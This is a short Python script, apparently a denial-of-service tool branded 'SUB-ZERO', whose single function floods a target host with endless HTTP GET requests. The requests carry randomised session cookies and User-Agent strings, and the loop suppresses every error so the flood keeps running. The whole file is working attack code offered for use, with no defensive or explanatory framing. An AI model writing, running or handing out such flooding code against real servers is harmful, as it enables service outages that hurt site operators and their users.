import random
import requests
'''
        ███████╗██╗   ██╗██████╗      ███████╗███████╗██████╗  ██████╗     
        ██╔════╝██║   ██║██╔══██╗     ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    
        ███████╗██║   ██║██████╔╝█████╗ ███╔╝ █████╗  ██████╔╝██║   ██║    
        ╚════██║██║   ██║██╔══██╗╚════╝███╔╝  ██╔══╝  ██╔══██╗██║   ██║    
        ███████║╚██████╔╝██████╔╝     ███████╗███████╗██║  ██║╚██████╔╝    
        ╚══════╝ ╚═════╝ ╚═════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     
                                                                                                                                                                     
'''

def http_cookie_flood(target_ip):
    while True:
        try:
            cookies = {
                "session": random.randint(1, 100000)
            }
            headers = {
                "User-Agent": random.choice(["Mozilla/5.0", "Chrome/91.0", "Safari/537.36"]),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Cache-Control": "no-cache"
            }
            requests.get(f"http://{target_ip}/", cookies=cookies, headers=headers)
        except:
            pass
